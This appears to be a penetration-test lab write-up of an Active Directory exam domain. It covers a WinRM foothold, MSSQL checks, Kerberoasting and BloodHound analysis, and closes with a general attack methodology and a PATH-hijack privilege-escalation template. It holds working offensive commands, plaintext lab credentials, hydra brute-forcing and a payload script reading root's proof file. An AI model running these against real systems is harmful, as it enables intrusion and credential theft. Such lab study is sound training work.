Reconnaissance

Same directory, new network position

Goal: establish what this network position actually gives us, and separate what is reachable from what is owned. This leg starts with credentials in hand — the work is proving what they are worth.

1.1 Where this leg sits

This is the same oscp.exam directory as the earlier AD page, seen from a different network:

That single change removes the chapter 05 problem entirely. There is no pivot to build, no proxychains wrapper on every command, and Kerberos talks to a KDC we can actually reach. Everything below is direct.

Three facts, and two of them are about what we cannot do.

IPC$ is READ — every authenticated account has that. It is the null session's authenticated cousin: useful for RPC enumeration, meaningless as access.

Build 19041 on a host named MS02 while DC01 reports 17763 is a mismatch worth noticing: the member server is a newer build than the domain controller.

1.4 The address the prompt was hiding

The MSSQL prompt in the next chapter reads guest@master, and it would be easy to assume guest is a separate database server. It is not:

  • nxc authenticates oscp.exam\web_svc against 10.10.152.142 and gets MS02;
  • the same account opens a SQL session on a host whose NetBIOS name is guest.

Same account, same box, two protocols. There is no pivot between them, which means the SQL work and the WinRM work are two views of one machine. That matters for the escalation logic in chapter 03: a SQL escalation lands on MS02, not somewhere new.

02

Foothold

WinRM, and the token that proves nothing

celia.almeda authenticates over WinRM and lands on MS02 with a shell. The point of this chapter is not the shell — it is proving what the token does not contain, because that decides whether the box falls here or somewhere else.

2.1 The connection

command
evil-winrm -i 10.10.152.142 -u celia.almeda -p '7k8XHk3dMtmpnC7'
output

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\celia.almeda\Documents>

A domain user over WinRM on a member server. Nothing exotic — the interesting part is the token.

Read it in three steps.

BUILTIN\Remote Management Users is the only reason this works. That group — not local Administrators — is what authorises WinRM. It is an explicit, deliberate grant on MS02, and it is the whole foothold.

The privilege list is the standard five. SeShutdown, SeChangeNotify, SeUndock, SeIncreaseWorkingSet, SeTimeZone. Nothing else. In particular:

  • no SeImpersonatePrivilege
  • no SeAssignPrimaryTokenPrivilege
  • no SeDebugPrivilege
  • no SeBackupPrivilege

Medium Mandatory Level confirms it: a normal user token, not a filtered administrator token.

2.3 Why this is a proof, not an assumption

The temptation is to say "no SeImpersonate, so no potato" and move on. The stronger argument is that this token could not have been an administrator's in the first place, whatever its privileges looked like.

UAC remote restrictions (LocalAccountTokenFilterPolicy) apply to local accounts. A domain account that sits in the machine's local Administrators group, authenticating over WinRM, receives a full privileged token — no filtering. So if celia were a local admin on MS02, either BUILTIN\Administrators would appear in the group list, or the privileges would include the admin set.

Neither is true. Therefore:

celia.almeda is not a local administrator on MS02, and the potato family (PrintSpoofer, GodPotato, JuicyPotato) has nothing to abuse here.

That closes the route that took MS01 in the previous leg. It is worth stating plainly because the same technique is the obvious reflex, and on this host it is a dead end.

2.4 What WinRM is not going to give us

Evil-WinRM runs commands as a network logon (type 3). That has a specific consequence for credential hunting:

  • no NL$ cached credential is created for this logon, so there is nothing new to dump;
  • no Kerberos TGT is issued into the session, so sekurlsa::tickets has nothing to show;
  • sekurlsa::logonpasswords on this host would show other users' material if it existed, but LSASS was already proven empty on MS01 in the previous leg.

So the runbook here is files, not memory:

command
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Unattend" /s
Get-ChildItem C:\Users\celia.almeda -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { $_.Extension -in '.txt','.xml','.config','.ini','.ps1' } |
  Select-Object -First 40 FullName

Those are candidates, not results — nothing from that list is yet confirmed, and this chapter does not claim otherwise.

03

MSSQL

Two logins, sysadmin = 0

MS02 runs SQL Server, and two of the accounts we hold are SQL logins on it. This chapter records the test that decides whether SQL is an escalation path or a dead end — and, because it came back negative, what that rules out precisely.

3.1 Who we are in SQL

The prompt itself is the first finding:

output
SQL (OSCP\web_svc  guest@master)>

Read right to left: database master, host guest, login OSCP\web_svc. And guest is MS02 — the same box the WinRM shell is on, not a separate database server. The same session run as the other account gives the mirror image:

output
SQL (OSCP\celia.almeda  guest@master)>

Two independent domain accounts, both with a SQL login on the same instance.

3.2 The only question that matters

output
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
output
-   -
0   0

And as celia:

output
SQL (OSCP\celia.almeda  guest@master)> SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
-   0

The decisive column is IS_SRVROLEMEMBER('sysadmin') — 0 for both logins. Neither is a member of sysadmin.

One note on reading this output: the first column came back as 0 rather than the login name, and the prompt (OSCP\web_svc, OSCP\celia.almeda) is the authoritative statement of identity here. The sysadmin answer is unaffected by that quirk — it is the second value, and it is zero in both cases.

3.3 What sysadmin = 0 actually closes

This is worth being exact about, because "not sysadmin" is not "no SQL attack surface".

Closed:

  • xp_cmdshell execution — it requires sysadmin or CONTROL SERVER;
  • sp_configure changes — same requirement;
  • reading other databases' data — a login without sysadmin only sees what it has been granted;
  • EXECUTE AS LOGIN = 'sa' — impersonation needs an explicit IMPERSONATE grant.

Still open, and deliberately not yet exercised:

  • xp_dirtree / xp_fileexist — executable by public by default. Pointing xp_dirtree at an SMB listener coaxes the SQL service account into an outbound NTLM authentication, which is a credential from a different security context than either login we hold. This is the single most promising remaining SQL primitive, and it requires no privilege at all.
  • IMPERSONATE grants — checked per-login, not per-role; a specific grant could exist even with role membership at zero.
  • Linked servers — sp_linkedservers may expose a second instance with different rights.

Both of those are queries to run, not findings. This chapter does not claim either returned anything.

3.4 The escalation that would have mattered

Had either login been sysadmin, the chain would have been:

output
sysadmin → xp_cmdshell → runs as the MSSQL service account → whoami /priv
         → SeImpersonate on the service account? → SYSTEM on MS02

Note the shape of it: xp_cmdshell does not run as you. It runs as the account the SQL service is configured with. That is why a SQL login is worth more than its own rights suggest — it is a way to borrow someone else's token. With sysadmin = 0 for both accounts, that borrowing is unavailable.

Path Result

SQL sysadmin (celia.almeda) no
xp_cmdshell unavailable without sysadmin
xp_dirtree hash capture untested — available to public
Linked servers / IMPERSONATE untested

4.4 Kerberoasting — and the two things that stopped it

command
impacket-GetUserSPNs oscp.exam/celia.almeda:'7k8XHk3dMtmpnC7' \
  -dc-ip 10.10.152.140 -request
output
ServicePrincipalName   Name     MemberOf  PasswordLastSet              LastLogon
---------------------  -------  --------  ---------------------------  --------------------------
MSSQL/MS02.oscp.exam   sql_svc            2022-12-05 05:49:44.637096   2022-11-10 03:15:51.783016
HTTP/MS01.oscp.exam    web_svc            2022-11-10 23:11:19.795439   2026-11-22 22:55:09.482611

The SPN list came back over LDAP — that part worked. The roast itself did not, for two compounding reasons:

No TGT. CCache file is not found — DC01.oscp.exam does not resolve, so no Kerberos ticket was ever obtained. Without a TGT, GetUserSPNs can enumerate but cannot request service tickets.

Clock skew. KRB_AP_ERR_SKEW — Kerberos rejects tickets when the client clock is more than five minutes off the KDC's. This is a VM, and a suspended VM drifts. The DC advertises TIMESERV GTIMESERV, which is both the diagnosis and the remedy:

command
sudo ntpdate -u 10.10.152.140

Both must be fixed before the roast can run; fixing one alone still fails.

4.5 The target is sql_svc, not web_svc

The table names two roastable accounts, and they are not equally useful:

sql_svc MSSQL/MS02.oscp.exam 2022-12-05 the MSSQL service account on MS02 — never rotated
web_svc HTTP/MS01.oscp.exam 2022-11-10 already owned: Diamond1

Roasting web_svc proves a password we already hold. sql_svc is the one that matters, for a reason that connects straight back to chapter 03: xp_cmdshell runs as the SQL service account, and sql_svc is that account. A cracked sql_svc is a different security context on MS02 — one that may carry SeImpersonatePrivilege, which neither of our logins does.

A service account whose password has not changed in four years is also just statistically likely to be weak.

05

BloodHound

Zero outbound edges, and one stale service account

A BloodHound collection is only worth what you extract from it. This chapter answers one question for each of our accounts: is there any object in this directory we can write to? The answer is no, and the way it is no is worth documenting, because it redirects the whole engagement back to credential attack.

5.1 Who actually is Domain Admin

   -> TOM_ADMIN@OSCP.EXAM

TOM_ADMIN is the interesting name: a human-looking administrative account alongside the built-in Administrator. Those are the two identities that end this engagement. Everything else is a means of becoming one of them.

For each account we hold, scan every object in the directory for an ACE whose principal is that account:

Not "few". None. celia.almeda, web_svc and eric.wallows hold no GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword, AddKeyCredentialLink, DCSync or AddMember anywhere.

5.3 Two other paths, both closed

LAPS is not deployed. haslaps is false on all three computers, so local administrator passwords are not randomised and not readable. There is no ReadLAPSPassword shortcut because there is no LAPS.

There are no sessions to steal. Session collection returned collected=true with zero results on all three computers:

MS01.OSCP.EXAM   sessions[collected=True n=0]

No Domain Admin is logged on to a member server, so there is nothing to relay or impersonate on MS02 despite its SMB signing being off. This may partly be an artefact of the NTLM fallback in chapter 04 — a Kerberos-backed collection could show sessions this run missed — so treat it as "not observed" rather than "proven absent".

DC01's local administrators are the default trio (Administrator, Enterprise Admins, Domain Admins) — correct for a domain controller, and offering nothing.

5.4 Reading the export correctly

One trap cost time here and is worth recording.

In a bloodhound-python legacy export, each object's Aces array contains ACEs on that object. For an inbound ACE, PrincipalSID is the grantor — the principal who holds the right — not the object's owner. Filtering Aces on a user therefore answers "who can control this user", not "what can this user control".

Read the wrong way, every user in the domain appears to hold GenericAll over Domain Admins, which is nonsense on its face: the same four rights appear identically for unrelated accounts, and the PrincipalSID resolves to -512 (Domain Admins) rather than to the user.

The correct question — what can this account control — requires scanning all objects and matching PrincipalSID against our accounts' SIDs. That is what section 5.2 does, and it comes back empty.

6.3 The most important negative

The WinRM one deserves its own paragraph, because it is the reflex that would otherwise be tried first — it is what took MS01 in the previous leg.

whoami /priv on MS02 shows exactly five privileges: SeShutdown, SeChangeNotify, SeUndock, SeIncreaseWorkingSet, SeTimeZone. No SeImpersonatePrivilege.

That alone is enough. But the stronger form of the argument is that the token could not have been an administrator's: UAC remote restrictions filter only local accounts, so a domain account in the machine's local Administrators group would receive a full privileged token over WinRM. Neither BUILTIN\Administrators nor the admin privilege set appears. Therefore celia.almeda is not a local administrator on MS02, and no privilege-escalation primitives exist in this token.

6.4 Two mechanical blockers

Both remaining actions are blocked by the same pair of host misconfigurations, not by anything in the target:

command
## 1. name resolution - Kerberos needs a name, not an IP
echo '10.10.152.140 DC01.oscp.exam oscp.exam' | sudo tee -a /etc/hosts

## 2. clock skew - Kerberos rejects >5 minutes' drift
sudo ntpdate -u 10.10.152.140
date -u

Until both are fixed, every roast fails with KRB_AP_ERR_SKEW and every collection silently degrades to NTLM — which is exactly what happened in chapter 04, and why the session data in chapter 05 is empty.

08

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

Privesc — PATH hijack template

command
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

## name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.
